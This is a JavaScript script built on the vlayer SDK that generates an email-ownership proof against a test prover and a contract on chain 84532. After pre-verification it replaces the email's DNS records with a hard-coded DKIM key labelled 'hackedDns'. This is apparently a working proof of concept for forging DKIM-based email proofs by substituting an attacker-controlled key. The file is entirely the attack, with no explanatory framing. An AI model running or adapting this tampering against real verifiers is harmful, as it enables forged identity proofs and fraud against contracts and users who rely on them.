import fs from "fs";
import { preverifyEmail, createVlayerClient } from "@vlayer/sdk";
import emailProverAbi from "./emailProver.abi.json" assert { type: "json" };

async function main() {
    try {
        // Read the email MIME-encoded file content
        const email = fs.readFileSync("data/mail.eml").toString();

        // Prepare the email for verification
        const unverifiedEmail = await preverifyEmail(email);
        const hackedDns = 'v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCPwsG12awgnJc3oDr984Y5bVhgJ+EPiGlPqGD+IwD/iVz80hI9o3AVfEjmUgHxCToZsuRxs6dez3TDD1wYRiWcNlmgcEy68IxuAf4nAGxmAueSKRYoencKlH5Bn5XDnQDlnZbr7WWsKlBoDfb2lhK+WSxmDm4oo7Zh+qxzh45elwIDAQAB; n=1024,1450901090,1466712290';
        unverifiedEmail.dnsRecords = [hackedDns];

        // Create vlayer server client
        const vlayer = createVlayerClient({url:"https://test-prover.vlayer.xyz"});

        const hash = await vlayer.prove({
            address: "0x38B00d0ba50f32f85883033F63B042750f33d057",
            proverAbi: emailProverAbi.abi,
            functionName: "main",
            args: [unverifiedEmail],
            chainId: 84532,
        });

        const result = await vlayer.waitForProvingResult(hash);
        
        // Create result object
        const resultData = {
            success: true,
            timestamp: new Date().toISOString(),
            hash: hash,
            proof: result,
            email: {
                dnsRecords: unverifiedEmail.dnsRecords
            }
        };

        // Print the result as JSON string
        console.log(JSON.stringify(resultData));
        
    } catch (error) {
        // Print error as JSON string
        console.log(JSON.stringify({
            success: false,
            error: error.message,
            stack: error.stack
        }));
    }
}

main();